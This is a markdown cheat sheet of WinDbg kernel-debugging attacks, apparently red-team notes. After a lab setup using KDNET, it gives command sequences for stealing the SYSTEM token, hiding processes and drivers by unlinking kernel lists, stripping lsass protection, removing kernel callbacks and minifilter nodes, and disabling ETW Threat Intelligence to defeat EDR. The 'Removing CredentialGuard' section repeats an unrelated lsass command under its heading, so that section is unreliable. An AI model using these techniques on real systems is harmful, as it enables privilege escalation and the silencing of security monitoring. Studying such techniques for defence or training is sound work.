## Windbg
- [General](#general)
	- [Lab setup](#lab-setup)
	- [General commands](#general-commands)
- [Attacks using WinDbg](#attacks-using-windbg)
	- [Stealing tokens](#stealing-tokens)
	- [Hiding processes](#hiding-processes)
	- [Changing protection](#changing-protection)
	- [Removing CredentialGuard](#removing-credentialguard)
	- [Removing Kernel Callbacks](#removing-kernel-callbacks)
	    - [Process Creation / Thread Creation / Image Loading](#process-creation--thread-creation--image-loading)
	    - [Registry operations](#registry-operations)
	    - [Object operations](#object-operations)
	    - [Minifilters](#minifilters)
	  - [ETW Kernel-mode provider](#etw-kernel-mode-provider)

## General
### Lab setup
- Enable kernel debugging using KDNET
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-network-debugging-of-a-virtual-machine-host

1. Create a External Virtual Switch and make sure to check the checkbox for "Allow management operating system to share this network adapter"

![](Pasted%20image%2020250326190228.png)

2. Disable Secure boot

![](Pasted%20image%2020250326184944.png)

3.  Install the [Debugging Tools for Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) through the SDK

![](Pasted%20image%2020250326191344.png)

4. Enable external debugging
	- Make sure the firewall is disabled on both systems

```
bcdedit /set testsigning on

"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kdnet.exe" <HOST / DEV MACHINE IP> 50000

"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\kdnet.exe" 172.16.100.36 50000
```

5. Run the printed command on the Host / DEV machine to start debugging with the old windbg

```
cd "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64"
.\windbg.exe -k net:port=50000,key=24cmz380p6ggv.38ahe6esscwps.2aedmxm6raa4i.1ix2tvw0ptgo5
```

Or open windbg and click on Attach to kernel and enter the key and port!

![](Pasted%20image%2020250326195309.png)

6. Reboot the debugged VM

```
shutdown -r -t 0
```

#### Disable debugging

```
bcdedit /debug off
```

### General commands
- https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/commands
- `dt` Display Type

#### Get EPROCCESS address
```
!process 0 0 <PROCESS>
dt nt!_eprocess <EPROCCESS_ADDR>
```

#### Fix symbols
```
.symfix
.reload /f

.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
.reload
```

#### Dump callstack 
- Example of `ProcessNotifyRoutines`

```
bp <module>!<function, variable, or exported symbol>

bp nt!PspCallProcessNotifyRoutines
k
```

#### Dump struct
- Example of `nt!_EPROCESS`

```
dt <module>!<struct_name>

dt nt!_EPROCESS
```

## Attacks using windbg
### Stealing tokens
- Replacing target process token with system token.
	- Can be used for privilege escalation
	- Can be used to downgrade protection level of EDR disabling the EDR's functionality

#### Identify launched EPROCESS of target process
```
!process 0 0 <PROCESS.exe>
dt nt!_eprocess <EPROCCESS_ADDR>
```

#### Get the EPROCESS token offset of target process
```
dt nt!_eprocess <EPROCCESS_ADDR> Token
```

#### Print token value of cmd
```
dt _EX_FAST_REF <EPROCCESS_ADDR>+<OFFSET>
```

#### Identify EPROCESS of system
```
!process 0 0 system
```

#### Print token value of system
```
dt _EX_FAST_REF <SYSTEM_EPROCESS>+<OFFSET>
```

#### Replace token value of target process and continue
```
eq <EPROCCESS_ADDR> <SYSTEM TOKEN VALUE>
```

#### Print token value of target process
```
dt _EX_FAST_REF <EPROCCESS_ADDR>+<OFFSET>
```

### Hiding processes
- in Windows kernel all processes are arranged in a doubly linked List of type `_LIST_ENTRY` called ActiveProcessLinks it’s part of EPROCESS structure
- Each process has its own ActiveProcessLinks that contains Flink and Blink, Flink points to the next process and Blink to the previous process

#### Get the EPROCESS ActiveProcessLinks offset
```
dt nt!_eprocess ActiveProcessLinks
```

#### List the LIST_ENTRY struct
```
dt nt!_LIST_ENTRY
```

#### Identify launched EPROCESS of target process
```
!process 0 0 <PROCESS.exe>
```

#### List cmd blink and flink
```
dt nt!_LIST_ENTRY <EPROCCESS_ADDR>+<OFFSET>
```

#### Change the values to hide process
```
# Previous process flink pointing to the next process activeprocesslinks
eq <BLINK> <FLINK>

# Next process blink pointing to the previous process activeprocesslinks
eq <FLINK>+0x8 <BLINK>

# Set CMD's activeprocesslinks flinkblink become null
eq <EPROCCESS_ADDR>+<OFFSET> 0x0

# Unlink the cmd's ActiveProcessLinks
eq <EPROCCESS_ADDR>+<OFFSET>+0x8 0x0
```

### Changing protection
- The Process Protection level resides in the kernel as a 1 byte value in the EPROCESS structure

#### Identify launched EPROCESS of lsass
```
!process 0 0 lsass.exe
```

#### Print current protection levels of lsass
```
dt nt!_eprocess <EPROCESS_ADDR> Protection.
```

#### Overwrite protection level of lsass with 0
- The offset is located on the line containing: `<OFFSET> Protection :`

```
eb <EPROCESS_ADDR>+<OFFSET> 0x00
```

### Removing CredentialGuard
- Patches Wdigest by changing the value of UseLogonCredential and CredGuardEnabled
	- `CredGuardEnabled` = `0` and `UseLogonCredential` = `1` allows the credentials to be stored as cleartext
	- `CredGuardEnabled` = `1` or `UseLogonCredential` = `0` forces the credentials to be stored as session only

#### Identify launched EPROCESS of lsass
```
!process 0 0 lsass.exe
```

#### Switch to the lsass process context
```
.process /i /p /r <EPROCESS_ADDR>
g
```

#### Check if credential guard is enabled
```
db wdigest!g_fParameter_UseLogonCredential L1
```

#### Overwrite protection level of lsass with 0
- The offset is located on the line containing: `<OFFSET> Protection :`

```
eb <EPROCESS_ADDR>+<OFFSET> 0x00
```

### Hiding loaded driver

#### List the driver object
```
!drvobj \Driver\<driverName> 7
```

#### Get driver section address
```
dt nt!_DRIVER_OBJECT <DRIVER OBJECT ADDRESS>
```

#### Get the blink and flink
```
dt nt!_LIST_ENTRY <DRIVER SECTION ADDRESS>
```

#### Change the values to driver
```
eq <BLINK> <FLINK>
eq <FLINK>+0x8 <BLINK>

eq <DRIVER SECTION ADDRESS> <DRIVER SECTION ADDRESS>
eq <DRIVER SECTION ADDRESS>+0x8 <DRIVER SECTION ADDRESS>
```

### Removing Kernel Callbacks

### Process Creation / Thread Creation / Image Loading
#### Dynamically - List the array of notify routines
- List kernel callback routine in arrays;
	- Process creation - `PspCreateProcessNotifyRoutine`
	- Thread creation - `PspCreateThreadNotifyRoutine`
	- Image loading - `PspLoadImageNotifyRoutine`
- Apply bitwise mask of `FFFFFFFFFFFFFFF8`
- Output
	- Each line is a routine registered, empty ones (`0000000000000000`) are empty

```
dqs nt!<CALLBACK ROUTINE ARRAY>
dps (<CALLBACK ADDRESS> & FFFFFFFFFFFFFFF8) L1
dps (<CALLBACK ADDRESS> & FFFFFFFFFFFFFFF8) L1
... Next next next
``` 

#### Manually - List the array of notify routines
- List of register callbacks
	- Process creation - `PsSetCreateProcessNotifyRoutine`
	- Thread creation - `PsSetCreateThreadNotifyRoutine` 
	- Image loading - `PsSetLoadImageNotifyRoutine` 

- Disassemble exported `nt!PsXXXNotifyRoutine` to find `call` to the callback array routine `nt!PsXXXNotifyRoutine`
- Disassemble the address of `nt!PspXXXNotifyRoutine` and find first `LEA` instruction to locate the callback array
- List the entries in callback array and apply bitwise mask of `& FFFFFFFFFFFFFFF8`

- Example with process kernel callbacks
```
u nt!PsSetXXXXNotifyRoutine
u <ADDRESS> L20
dqs <ADDRESS OF PsSetXXXNotifyRoutine LEA INSTRUCTION>
dps (<CALLBACK ADDRESS> & FFFFFFFFFFFFFFF8) L1
dps (<CALLBACK ADDRESS> & FFFFFFFFFFFFFFF8) L1
... Next next next
```

#### Remove callback routines
- Remove it by zeroing out the memory
- Take the first address not the callback address from before!

```
eq <ENTRY ADDRESS> 0
```

### Registry operations
#### Dynamically - Iterating through the list
- Kernel callback double linked list of registry operations stored in `CallbackListHead`
- Output
	- First entry is the Flink
	- Second entry is the blink
	- NA
	- NA
	- Pre operation kernel callback
	- Post operation kernel callback

```
dps nt!CallbackListHead L7
dps <FLINK ADDRESS> L7
dps <FLINK ADDRESS> L7
... Next next next
```

#### Manually - Finding LEA instruction
- Disassemble exported `nt!CmRegisterCallback` to find `call` to the `CmpRegisterCallbackInternal`
- Disassemble the address of `CmpRegisterCallbackInternal` to get address of `CmpInsertCallbackInListByAltitude`
- Disassemble the address of `CmpInsertCallbackInListByAltitude` and find first `LEA` instruction to locate double linked callback list head `CallbackListHead`
- List the entries in callback array
- Output
	- First entry is the Flink
	- Second entry is the blink
	- NA
	- NA
	- Pre operation kernel callback
	- Post operation kernel callback

```
u nt!CmRegisterCallback
u <CALL INSTRUCTION ADDRESS> L60
u <CmpInsertCallbackInListByAltitude ADDRESS> L10
dps <ADDRES OF LEA INSTRUCTION>
dps <FLINK ADDRESS> L7
dps <FLINK ADDRESS> L7
... Next next next
```

#### Unlink linked lists
- Change the CallbackListHead Flink and Blink and make them point to the CallbackListHead itself.

```
eq <CALLBACK LIST ADDRESS> <CALLBACK LIST ADDRESS>
eq <CALLBACK LIST ADDRESS>+0x8 <CALLBACK LIST ADDRESS>
```

### Object operations
#### Dynamically - Iterating through the list
- Kernel callback double linked list of Object operations stored in `PsProcessType->CallbackList` and `PsThreadType->CallbackList` for processes and threads!
- Output
	- First entry: PsProcessType ADDRESS
	- ...
	- 6th entry: OFFSET CallbackList

```
dx @$ProcObj = *(nt!_OBJECT_TYPE **)&nt!PsProcessType
dps <PsProcessType ADDRESS>+0xc8 L8
dps <FLINK ADDRESS> L8
```

```
dx @$ThreadObj = *(nt!_OBJECT_TYPE **)&nt!PsThreadType
dps <PsProcessType ADDRESS>+0xc8 L8
dps <FLINK ADDRESS> L8
```

#### Unlink linked lists
- Changing the PsXXXType callbacklist Flink and Blink and make them pointing to the CallbackList itself

```
eq <PsXXXType ADDRESS>+0xc8 <PsXXXType ADDRESS>+0xc8
eq <PsXXXType ADDRESS>+0xc8+0x8 <PsXXXType ADDRESS>+0xc8
```

### Minifilters
#### Dynamically - Minifilters
- Enable unqualified symbols
- List all loaded minifilters
- Each `FLT_FILTER` represents minifilter driver and can have one or more instances of `FLT_INSTANCE`
- For each `FLT_INSTANCE` command view its filesystem operation-specific callback nodes `CALLBACK_NODE`
- Display information about `CALLBACK_NODE`

```
.symopt- 100
!fltkd.filters
!instance <FLT_INSTANCE ADDRESS> 4
!instance <FLT_INSTANCE ADDRESS> 4
... Next next next
dt _CALLBACK_NODE <CALLBACK_NODE ADDRESS>
```

#### Remove Linked List
- Unlink a callback node by modifying the flink and blink
- Gotta do this for each NODE!

```
dt nt!_LIST_ENTRY <CALLBACK_NODE ADDRESS>
eq <BLINK ADDRESS> <FLINK ADDRESS>
eq <FLINK ADDRESS>+0x8 <BLINK ADDRESS>

eq <CALLBACK_NODE ADDRESS> 0x0
eq <CALLBACK_NODE ADDRESS>+0x8 0x0
```

### ETW Kernel-mode provider
### Listing ETW provider
- Reverse driver of EDR or `ntoskrnl.exe` to retrieve Registration handle name
	- Open the file in IDA
	- Check the imports/exports for the functions that registers ETW `EtwRegister`
	- Check if they it is dynamically resolved by searching trough `mmGetSystemRoutineAddress` in IDA. 
	- Then click on it and press `x`  to cross reference.
	- Check where it write events with `EtwWrite` and write down the first parameter
- Resolve ETW provider registration handle
	- `nt!EtwThreatIntProvRegHandle` - For Microsoft Windows Thread Intelligence (EtwTi)
- Identify `_ETW_GUID_ENTRY` offset and its address
- Identify `_TRACE_ENABLE_INFO` offset and get its member `IsEnabled` value

```
x <DRIVER NAME>!<REG HANDLE NAME>
dq <REG HANDLE ADDR> L1

dt nt!_ETW_REG_ENTRY <REG HANDLE VALUE>
dq <REG HANDLE VALUE>+<OFFSET GUIDENTRY> L1

dt nt!_ETW_GUID_ENTRY <ETW GUID ENTRY ADDR>
dt nt!_TRACE_ENABLE_INFO <ETW GUID ENTRY ADDR>+<OFFSET PROVIDERENABLEINFO>
```

#### Removing ETW provider
```
eb <ETW GUID ENTRY ADDR>+<OFFSET> 0x0
```

#### Removing ETW provider - oneliner
- Can check value with `db poi(poi(<DRIVER NAME>!<REG HANDLE NAME>) + 0x20) + 0x60 L1`
```
eb poi(poi(<DRIVER NAME>!<REG HANDLE NAME>) + 0x20) + 0x60 00
```

#### Microsoft Windows Thread Intelligence example
- Also known as (EtwTi) 

```
eb poi(poi(nt!EtwThreatIntProvRegHandle) + 0x20) + 0x60 00
```